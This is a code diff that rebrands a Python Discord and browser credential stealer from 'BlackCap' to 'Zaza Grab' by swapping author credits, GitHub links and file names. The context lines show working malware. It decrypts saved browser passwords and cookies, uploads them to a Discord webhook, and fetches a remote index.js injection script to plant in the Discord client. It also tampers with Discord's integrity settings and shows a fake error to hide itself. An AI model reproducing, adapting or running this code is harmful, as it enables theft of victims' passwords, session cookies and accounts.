@@ -53,7 +53,7 @@ Passw = [];
 
 __config__ = {
     'yourwebhookurl': "%WEBHOOK_HERE%",
-    'blackcap_inject_url': "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
+    'blackcap_inject_url': "https://raw.githubusercontent.com/xKrustyDemonx/zaza-inject/main/index.js",
     'hide': '%_hide_script%',
     'ping': '%ping_enabled%',
     'pingtype': '%ping_type%',
@@ -279,15 +279,15 @@ class bl4ckc4p(Functions):
 
     def fakeerror(self: str) -> str:
         if self.fake_error == "yes":
-            ctypes.windll.user32.MessageBoxW(None, 'Error code: BlackCap_0x988958\nSomething gone wrong.', 'Fatal Error', 0)
+            ctypes.windll.user32.MessageBoxW(None, 'Error code: ZazaGrab_0x988958\nSomething gone wrong.', 'Fatal Error', 0)
 
     def pingonrunning(self: str) -> str:
         ping1 = {
-            'avatar_url': 'https://media.discordapp.net/attachments/1023241847046418522/1032289976710352917/blackcap_2.png',
+            'avatar_url': 'https://media.discordapp.net/attachments/1055997057149710388/1066504205835173928/zazagrab2.jpg',
             'content': "@everyone"
             }
         ping2 = {
-            'avatar_url': 'https://media.discordapp.net/attachments/1023241847046418522/1032289976710352917/blackcap_2.png',
+            'avatar_url': 'https://media.discordapp.net/attachments/1055997057149710388/1066504205835173928/zazagrab2.jpg',
             'content': "@here"
             }
         if self.pingonrun == "yes":
@@ -445,7 +445,7 @@ class bl4ckc4p(Functions):
                                             pass
 
                                     if self.h00ksreg in self.w3bh00k:
-                                        f = httpx.get(self.fetch_conf('blackcap_inject_url')).text.replace("%WEBHOOK%", self.w3bh00k)
+                                        f = httpx.get(self.fetch_conf('zazagrab_inject_url')).text.replace("%WEBHOOK%", self.w3bh00k)
                                     
                                     try:
                                         with open(inj_path + 'index.js', 'w', errors="ignore") as indexFile:
@@ -473,7 +473,7 @@ class bl4ckc4p(Functions):
                     item = json.load(f)
                 except json.decoder.JSONDecodeError:
                     return
-                item['ksch_is_here'] = "https://github.com/KSCHdsc"
+                item['ksch_is_here'] = "https://github.com/xKrustyDemonx"
                 item['auto_start'] = False
                 item['auto_start_discord'] = False
                 item['integrity'] = False
@@ -490,7 +490,7 @@ class bl4ckc4p(Functions):
             with open(config, 'w') as f:
                 json.dump(item, f, indent=2, sort_keys=True)
             with open(config, 'a') as f:
-                f.write("\n\n//KSCH_is_here | https://github.com/KSCHdsc")
+                f.write("\n\n//Soles_is_here | https://github.com/xKrustyDemonx")
 
     async def kllprcsx(self):
         bllist = self.fetch_conf('blprggg')
@@ -961,9 +961,9 @@ GoogleMaps: {self.googlemap}
                         os.remove(path)
                     else:
                         with open(path, "w", encoding="utf-8", errors="ignore") as f:
-                            f.write("Black Cap Create By KS.H | https://github.com/KSCHdsc\n\n")
+                            f.write("Zaza Grab Create By Soles | https://github.com/xKrustyDemonx\n\n")
                         with open(path, "a", encoding="utf-8", errors="ignore") as fp:
-                            fp.write(x + "\n\nBlack Cap Create By KSCH | https://github.com/KSCHdsc")
+                            fp.write(x + "\n\nZaza Grab Create By Soles | https://github.com/xKrustyDemonx")
 
         _zipfile = ntpath.join(self.appdata, f'BC-[{infocom}].zip')
         zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
@@ -985,17 +985,17 @@ GoogleMaps: {self.googlemap}
         fileCount = f"{file_count} Files Found: "
 
         embed = {
-            'name': "Blackcap",
+            'name': "ZazaGrab",
             'avatar_url': 'https://media.discordapp.net/attachments/1023241847046418522/1032289976710352917/blackcap_2.png',
             'embeds': [
                 {
                     'author': {
-                        'name': f'Black - Cap v2.1',
-                        'url': 'https://github.com/KSCHdsc',
+                        'name': f'Zaza - Grab v2.1',
+                        'url': 'https://github.com/xKrustyDemonx',
                         'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'
                     },
                     'color': 374276,
-                    'description': f'[Black - Cap has Geo Localised this guy]({self.googlemap})',
+                    'description': f'[Zaza - Grab has Geo Localised this guy]({self.googlemap})',
                     'fields': [
                         {
                             'name': '\u200b',
@@ -1037,7 +1037,7 @@ GoogleMaps: {self.googlemap}
                         }
                     ],
                     'footer': {
-                        'text': 'Black Cap Create By KSCH・https://github.com/KSCHdsc'
+                        'text': 'Zaza Grab Create By Soles・https://github.com/xKrustyDemonx'
                     }
                 }
             ]
@@ -1256,17 +1256,17 @@ def upload(name, tk=''):
                 }
             ],
             "author": {
-                'name': f'Black - Cap v2.2',
-                'url': 'https://github.com/KSCHdsc',
-                'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'
+                'name': f'Zaza - Grab v2.2',
+                'url': 'https://github.com/xKrustyDemonx',
+                'icon_url': 'https://raw.githubusercontent.com/xKrustyDemonx/zazagrab-assets/main/mona-loading-dark.gif'
             },
             "footer": {
-                "text": "github.com/KSCHdsc"
+                "text": "https://github.com/xKrustyDemonx"
             },
             'color': 374276,
             }
         ],
-        "avatar_url": "https://media.discordapp.net/attachments/1023241847046418522/1032289976710352917/blackcap_2.png",
+        "avatar_url": "https://media.discordapp.net/attachments/1055997057149710388/1066504205835173928/zazagrab2.jpg",
         "attachments": []
         }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
@@ -1275,7 +1275,7 @@ def upload(name, tk=''):
     path = name
     files = {'file': open(path, 'rb')}
 
-    if "bc_allpasswords" in name:
+    if "zg_allpasswords" in name:
 
         ra = ' | '.join(da for da in paswWords)
 
@@ -1294,22 +1294,22 @@ def upload(name, tk=''):
                 }
             ],
             "author": {
-                'name': f'Black - Cap v2.2',
-                'url': 'https://github.com/KSCHdsc',
-                'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'
+                'name': f'Zaza - Grab v2.2',
+                'url': 'https://github.com/xKrustyDemonx',
+                'icon_url': 'https://raw.githubusercontent.com/xKrustyDemonx/zazagrab-assets/main/mona-loading-dark.gif'
             },
             "footer": {
-                "text": "github.com/KSCHdsc",
+                "text": "github.com/xKrustyDemonx",
             },
             'color': 374276,
             }
         ],
-         "avatar_url": "https://media.discordapp.net/attachments/1023241847046418522/1032289976710352917/blackcap_2.png",
+         "avatar_url": "https://media.discordapp.net/attachments/1055997057149710388/1066504205835173928/zazagrab2.jpg",
         "attachments": []
         }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
 
-    if "bc_allcookies" in name:
+    if "zg_allcookies" in name:
         rb = ' | '.join(da for da in cookiWords)
         if len(rb) > 1000:
             rrrrr = Reformat(str(cookiWords))
@@ -1326,17 +1326,17 @@ def upload(name, tk=''):
                 }
             ],
             "author": {
-                'name': f'Black - Cap v2.2',
-                'url': 'https://github.com/KSCHdsc',
-                'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'
+                'name': f'Zaza - Grab v2.2',
+                'url': 'https://github.com/xKrustyDemonx',
+                'icon_url': 'https://raw.githubusercontent.com/xKrustyDemonx/zazagrab-assets/main/mona-loading-dark.gif'
             },
             "footer": {
-                "text": "github.com/KSCHdsc",
+                "text": "github.com/xKrustyDemonx",
             },
             'color': 374276,
             }
         ],
-         "avatar_url": "https://media.discordapp.net/attachments/1023241847046418522/1032289976710352917/blackcap_2.png",
+         "avatar_url": "https://media.discordapp.net/attachments/1055997057149710388/1066504205835173928/zazagrab2.jpg",
         "attachments": []
         }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
@@ -1346,7 +1346,7 @@ def upload(name, tk=''):
 def writeforfile(data, name):
     path = os.getenv("TEMP") + f"\{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"Created by KSCH | https://github.com/KSCHdsc\n\n")
+        f.write(f"Created by Soles | https://github.com/xKrustyDemonx\n\n")
         for line in data:
             if line[0] != '':
                 f.write(f"{line}\n")
@@ -1361,7 +1361,7 @@ def getPassw(path, arg):
     pathC = path + arg + "/Login Data"
     if os.stat(pathC).st_size == 0: return
 
-    tempfold = temp + "blackcaped" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+    tempfold = temp + "zazagrabed" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
     shutil.copy2(pathC, tempfold)
     conn = connect(tempfold)
     cursor = conn.cursor()
@@ -1386,7 +1386,7 @@ def getPassw(path, arg):
                 if wa in row[0]:
                     if not old in paswWords: paswWords.append(old)
             Passw.append(f"URL: {row[0]} \n ID: {row[1]} \n PASSW0RD: {DecryptValue(row[2], master_key)}\n\n")
-    writeforfile(Passw, 'bc_allpasswords')
+    writeforfile(Passw, 'zg_allpasswords')
 
 Cookies = []
 def getCookie(path, arg):
@@ -1396,7 +1396,7 @@ def getCookie(path, arg):
     pathC = path + arg + "/Cookies"
     if os.stat(pathC).st_size == 0: return
 
-    tempfold = temp + "blackcaped" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+    tempfold = temp + "zazagrabed" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
 
     shutil.copy2(pathC, tempfold)
     conn = connect(tempfold)
@@ -1423,7 +1423,7 @@ def getCookie(path, arg):
                 if wa in row[0]:
                     if not old in cookiWords: cookiWords.append(old)
             Cookies.append(f" HOST KEY: {row[0]} | NAME: {row[1]} | VALUE: {DecryptValue(row[2], master_key)}")
-    writeforfile(Cookies, 'bc_allcookies')
+    writeforfile(Cookies, 'zg_allcookies')
 
 def checkIfProcessRunning(processName):
     '''
@@ -1531,7 +1531,7 @@ def GatherAll():
     global upths
     upths = []
 
-    for file in ["bc_allpasswords.txt", "bc_allcookies.txt"]:
+    for file in ["zg_allpasswords.txt", "zg_allcookies.txt"]:
         upload(os.getenv("TEMP") + "\\" + file)
 
 
